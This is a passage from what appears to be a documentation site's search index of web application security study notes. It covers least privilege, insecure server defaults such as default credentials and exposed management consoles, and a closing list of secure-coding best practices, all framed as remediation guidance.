operations, and inter-component communication, each with only the necessary permissions.</li> <li>Secure Key Management: Store decryption keys in a separate, highly secured key management system or different tier, separate from the encrypted data.</li> <li>Network Segmentation: Implement strict network segmentation between tiers to limit direct communication paths and enforce security policies.</li> </ol> </li> <li> <p>Explanation of Fix: Applying least privilege minimizes the \"blast radius\" of a compromise. If the web tier is compromised, an attacker cannot automatically gain DBA privileges if the web application only connects with a limited-privilege account. Segregating keys and sensitive data prevents direct access to them even if the application component itself is breached.</p> </li> </ul>"},{"location":"appsec/WAHH/#15-vulnerable-server-configuration-and-software","title":"15. Vulnerable Server Configuration and Software","text":"<p>These refer to weaknesses in the web server and application server software itself, or its configuration, which can be leveraged by attackers to compromise the application or underlying system.</p>"},{"location":"appsec/WAHH/#default-credentials-content","title":"Default Credentials &amp; Content","text":"<ul> <li> <p>Description / Definition: Vulnerabilities due to web servers or application servers running with default administrative credentials or exposing default, unnecessary content (e.g., sample pages, administration interfaces) in a production environment.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>Leaving <code>admin/admin</code> as the default login for a server management console.</li> <li>Apache Tomcat's default \"manager\" application being accessible in production without strong authentication.</li> <li>Default documentation or example scripts being browsable, potentially revealing server versions or internal paths.</li> </ul> </li> <li> <p>Root Cause: A lack of hardening and security awareness during deployment. Vendors ship products with defaults for ease of use, but these are often insecure for production, and administrators fail to change them.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Change Default Credentials: Immediately change all default usernames and passwords for web servers, application servers, and any management interfaces.</li> <li>Remove Default/Unnecessary Content: Remove or disable all default, sample, or unnecessary content and applications from production servers.</li> <li>Restrict Management Interfaces: Limit access to administrative interfaces to trusted IP addresses only and/or unique, strong credentials, possibly on a different port.</li> </ol> </li> <li> <p>Explanation of Fix: Changing default credentials removes easy entry points for attackers who rely on publicly known default logins. Removing unnecessary content reduces the attack surface by eliminating potentially vulnerable or informative files/applications that are not needed for production.</p> </li> </ul>"},{"location":"appsec/WAHH/#key-takeaways-best-practices-and-patterns","title":"Key Takeaways, Best Practices, and Patterns","text":"<p>This comprehensive analysis reveals several recurring themes and best practices for developing secure applications:</p> <ol> <li>Never Trust User Input: This is the fundamental principle of web application security. All input from users, external components, or untrusted sources must be validated and sanitized.</li> <li>Validate on Output (Context-Sensitive Encoding): For vulnerabilities like XSS, output encoding based on the context of where data is inserted into HTML, JavaScript, or URLs is paramount. Input validation helps, but output encoding is the critical control for display.</li> <li>Separate Code from Data: For injection vulnerabilities (SQL, LDAP, XPath, OS Command, Script), the core issue is the blending of code and data. Use parameterized queries or APIs that strictly separate user input from executable commands/queries.</li> <li>Implement Robust Authorization Server-Side: All access control decisions must be enforced on the server-side. Client-side controls are easily bypassed. Employ least privilege and perform per-resource/per-function authorization checks.</li> <li>Strong Cryptography: Use standard, well-vetted, and cryptographically strong algorithms for hashing passwords (with salts and adaptive functions) and encrypting sensitive data. Never \"roll your own crypto\".</li> <li>Secure Session Management: Generate cryptographically strong and unpredictable session IDs. Regenerate session IDs upon authentication or privilege change. Transmit session tokens only over HTTPS and use <code>Secure</code> and <code>HttpOnly</code> flags.</li> <li>Generic Error Handling: Avoid verbose error messages, stack traces, or debug information in production. Provide generic error messages to prevent information leakage.</li> <li>Secure Defaults and Hardening: Always change default credentials and remove unnecessary services, content, and debug functionality in production environments. Configure components with the principle of least privilege.</li> <li>Defense in Depth: No single control is foolproof. Implement multiple layers of security controls throughout the application's design and development lifecycle to provide redundancy in case one defense fails.</li> <li>Regular Security Testing &amp; Code Review: Conduct manual secure code reviews and penetration testing in addition to automated tools. Manual review provides contextual understanding and can find subtle logic flaws that tools miss. Automated tools can aid in finding common vulnerabilities and scanning large codebases.</li> <li>Developer Education: Many vulnerabilities stem from a lack of security awareness. Continuous training for developers on secure coding practices is crucial.</li> </ol> <p>By adhering to these principles, developers can significantly reduce the attack surface and enhance the overall security posture of web applications.</p>"}]}